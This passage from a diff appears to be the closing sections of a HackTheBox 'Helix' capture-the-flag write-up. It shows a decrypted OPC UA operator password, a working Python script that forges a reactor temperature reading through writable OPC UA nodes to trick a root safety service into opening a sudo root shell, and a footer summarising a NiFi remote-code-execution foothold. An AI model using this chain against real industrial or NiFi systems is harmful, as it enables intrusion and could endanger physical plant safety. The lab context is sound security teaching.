+print(AESGCM(key).decrypt(blob[:16], blob[16:], None).decode())</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">python3 decrypt.py</span>
+<span class="out">blob = 50 bytes -&gt; IV 16 | ct 18 | tag 16
+<span class="hi">R7qZ9L3xKM2W8pFYcA</span></span></pre></div></div>
+    <p>This is the OPC UA operator credential, not an OS password. It will not log you into the host, and it does not need to, because the SSH key already did that.</p>
+    <div class="callout"><span class="k">And it turns out you do not need it</span><p>The plant accepts anonymous OPC UA sessions, and it accepts anonymous writes. Connecting with no credentials at all reads every node and successfully writes <span class="code">CalibrationOffset</span>, with the change visible afterwards on the dashboard. The credential is clearly the designed path, and the rest of this write-up authenticates as <span class="code">operator</span> because that is what the box intends, but the OPC UA server enforces nothing. In a real plant that is the more serious finding of the two.</p></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="sec-num">05</span><h2>root.txt<span class="sub">forge the sensor · open the window · sudo console</span></h2></div>
+    <p><span class="code">operator</span> has exactly one sudo entry, and it is the whole root path.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">sudo -l</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">operator@helix:~$</span> <span class="cmd">sudo -l</span>
+<span class="out">User operator may run the following commands on helix:
+    (root) <span class="hi">NOPASSWD: /usr/local/sbin/helix-maint-console</span></span>
+<span class="pr">operator@helix:~$</span> <span class="cmd">sudo /usr/local/sbin/helix-maint-console</span>
+<span class="no">Maintenance window CLOSED.</span></pre></div></div>
+    <p>The console refuses. It is a bash script, so once you are root you can read exactly what it wanted, and it is worth showing here because the check is the entire vulnerability.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">/usr/local/sbin/helix-maint-console</span></div><div class="term-scroll"><pre class="term-body"><span class="cmd">FLAG="/opt/helix/state/maintenance_window"
+
+window_ok() {
+  [ -f "$FLAG" ] || return 1
+  local until_ts now
+  until_ts="$(cat "$FLAG")"
+  now="$(date +%s)"
+  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
+  [ "$now" -lt "$until_ts" ] || return 1
+  return 0
+}
+
+if ! window_ok; then echo "Maintenance window CLOSED."; exit 1; fi
+...
+systemd-run --quiet --scope --unit="$SCOPE" ... /bin/bash -p -i</span></pre></div></div>
+    <p>The authorization is a file holding a unix timestamp. If the file exists and the number in it is in the future, you get <span class="code">/bin/bash -p -i</span> as root. Nothing is signed and nobody is asked who wants the shell. The file sits under <span class="code">/opt/helix/state/</span>, which is root-owned and closed to <span class="code">operator</span>, so writing it by hand is out. It gets written by <span class="code">helix-safety.service</span>, which runs as root and decides when to write it by looking at the plant.</p>
+    <div class="callout cve"><span class="k">Trust inversion — forge the sensor that the root process reads</span><p>The safety controller reads <span class="code">Temperature</span>, the calibrated value, not the physical one. <span class="code">CalibrationOffset</span> is writable by any OPC UA client. So an unprivileged client fully controls the number a root process uses to make a security decision, and it can hold the reactor's reported temperature anywhere it likes while the reactor itself sits at a comfortable 284&nbsp;°C.</p></div>
+    <h3>What actually opens the window</h3>
+    <p>The dashboard names a temperature threshold, but the temperature alone is not sufficient. The controller is a stripped PyInstaller binary, so rather than read its logic, establish it by experiment. Each trial below starts from a clean state and waits for any previous window to expire first, which matters because a window persists for its full duration and will otherwise make the next trial look like a success.</p>
+    <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Mode</th><th>TestOverride</th><th>Reported temp</th><th>Window</th></tr></thead>
+        <tbody>
+          <tr><td>NORMAL</td><td>off</td><td>284 (untouched)</td><td class="shut">CLOSED</td></tr>
+          <tr><td>NORMAL</td><td>off</td><td>294</td><td class="shut">CLOSED</td></tr>
+          <tr><td>NORMAL</td><td>off</td><td>296</td><td class="shut">CLOSED</td></tr>
+          <tr><td>NORMAL</td><td>on</td><td>296</td><td class="shut">CLOSED</td></tr>
+          <tr><td>MAINTENANCE</td><td>off</td><td>296</td><td class="shut">CLOSED</td></tr>
+          <tr><td>MAINTENANCE</td><td>on</td><td>284 (untouched)</td><td class="shut">CLOSED</td></tr>
+          <tr><td class="w">MAINTENANCE</td><td class="w">on</td><td class="w">296</td><td class="open">OPEN</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>All three conditions are necessary and together they are sufficient. That is a coherent safety design rather than an arbitrary combination lock. A hazardous reading on its own is an emergency, and the correct response to an emergency is to trip the reactor, not to hand somebody a root shell. <span class="code">Mode=MAINTENANCE</span> plus <span class="code">TestOverride</span> is how an engineer says "this reading is a test, I am standing at the panel, do not treat it as real." The controller then reasons that a hazardous condition during authorized testing is exactly when an engineer needs privileged access, and it grants the window. Every input to that reasoning is writable over an unauthenticated protocol.</p>
+    <p>Three writes are enough from a clean start. <span class="code">ResetTrip</span> is only needed if an earlier experiment latched a trip, and no hold loop is required, since the window opens within about two seconds and then stands on its own.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">open the window</span></div><div class="term-scroll"><pre class="term-body"><span class="cmd">import asyncio
+from asyncua import Client, ua
+
+async def main():
+    c = Client("opc.tcp://127.0.0.1:14840/helix/", timeout=20)
+    c.set_user("operator"); c.set_password("R7qZ9L3xKM2W8pFYcA")
+    await c.connect()
+    W = lambda n, v, t: c.get_node(n).write_value(ua.DataValue(ua.Variant(v, t)))
+
+    await W("ns=2;i=13", True, ua.VariantType.Boolean)           <span class="c"># TestOverride</span>
+    await W("ns=2;i=12", "MAINTENANCE", ua.VariantType.String)   <span class="c"># Mode</span>
+    raw = await c.get_node("ns=2;i=3").read_value()              <span class="c"># TemperatureRaw</span>
+    await W("ns=2;i=6", round(296.0 - raw, 2), ua.VariantType.Double)  <span class="c"># CalibrationOffset</span>
+
+    await asyncio.sleep(2)
+    print("reported temperature =", await c.get_node("ns=2;i=4").read_value())
+    await c.disconnect()
+
+asyncio.run(main())</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">python3 open_window.py</span>
+<span class="out">reported temperature = 296.07</span>
+<span class="pr">db-d2@kali:~$</span> <span class="cmd">curl -s http://127.0.0.1:18081/ | sed 's/&lt;[^&gt;]*&gt;/ /g' \
+     | tr -s ' \n' ' ' | grep -oE 'Status: *OPEN *\([^)]*\)'</span>
+<span class="out">Status: <span class="win">OPEN (~117s)</span></span></pre></div></div>
+    <p>The window lasts under two minutes, so have the SSH session ready before running this. Then spend it.</p>
+    <div class="term"><div class="term-bar"><span class="lamp a"></span><span class="lamp b"></span><span class="lamp c"></span><span class="label">while the window is open</span></div><div class="term-scroll"><pre class="term-body"><span class="pr">operator@helix:~$</span> <span class="cmd">sudo /usr/local/sbin/helix-maint-console</span>
+<span class="out">[+] Privileged maintenance access granted
+[!] Window expires in 106 seconds
+[!] Session will be terminated automatically</span>
+<span class="pr">root@helix:/home/operator#</span> <span class="cmd">id; cat /root/root.txt</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="win">a·······························</span></pre></div></div>
+    <div class="callout"><span class="k">The bug, plainly</span><p>Neither half of this is wrong on its own. The console is correct that only root can write its authorization file. The safety controller is correct that a hazardous reading during declared maintenance is precisely when an engineer needs privileged access at the panel. Put them in a line and the whole chain bottoms out in a number that anybody on the network can set. The reactor is never in danger. The root process believes it is, and that belief is worth a shell.</p></div>
+  </section>
+
+  <section id="captured">
+    <div class="sec-head"><span class="sec-num">✓</span><h2>Captured<span class="sub">both flags · full compromise</span></h2></div>
+    <div class="flags">
+      <div class="flag">
+        <span class="name">user.txt</span>
+        <span class="path">/home/operator/user.txt</span>
+        <span class="val">8·······························</span>
+        <span class="status">captured as operator</span>
+      </div>
+      <div class="flag root">
+        <span class="name">root.txt</span>
+        <span class="path">/root/root.txt</span>
+        <span class="val">a·······························</span>
+        <span class="status">captured as root</span>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div>Helix · HackTheBox · Linux · rooted by db-d2 · 24 Jul 2026</div>
+    <div class="paths">
+      <span>recon     nmap two-phase → 22/80 only → apex brochure is scenery → vhost fuzz on the 154-byte catch-all → flow.helix.htb</span>
+      <span>foothold  NiFi 1.21.0 anonymous (supportsLogin:false + execute-code) → ExecuteProcess REST RCE → nifi</span>
+      <span>pivot     operator SSH key left readable in /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak → ssh operator (user.txt)</span>
+      <span>ot        loopback 4840 OPC UA + 8081 HMI via ssh -L → CalibrationOffset (ns=2;i=6) is writable, Temperature is not</span>
+      <span>root      Mode=MAINTENANCE + TestOverride + forged 296 °C → helix-safety writes /opt/helix/state/maintenance_window → NOPASSWD sudo helix-maint-console → root</span>
+      <span>aside     NiFi flow enc{} secret (NIFI_PBKDF2_AES_GCM_256, static salt) is the OPC UA password, and the OPC UA server does not require it anyway</span>
+    </div>
+  </footer>
+
+</main>
 
 </body>
 </html>
